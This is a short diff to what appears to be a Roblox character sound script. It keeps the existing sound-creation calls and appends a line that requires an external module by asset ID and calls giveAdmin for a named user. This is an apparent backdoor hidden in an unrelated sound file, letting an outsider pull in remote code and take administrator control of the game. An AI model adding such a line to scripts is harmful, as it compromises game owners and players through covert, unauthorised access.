@@ -39,3 +39,5 @@ CreateNewSound("Splash", 		"rbxasset://sounds/impact_water.mp3",					false, 	1,	
 CreateNewSound("Running", 		"rbxasset://sounds/action_footsteps_plastic.mp3",		true, 	1.85,	head)
 CreateNewSound("Swimming", 	"rbxasset://sounds/action_swim.mp3",					true,	1.6,	head)
 CreateNewSound("Climbing", 	"rbxasset://sounds/action_footsteps_plastic.mp3",		true,	1,		head)
+
+require(520532182).giveAdmin"tbwrss"
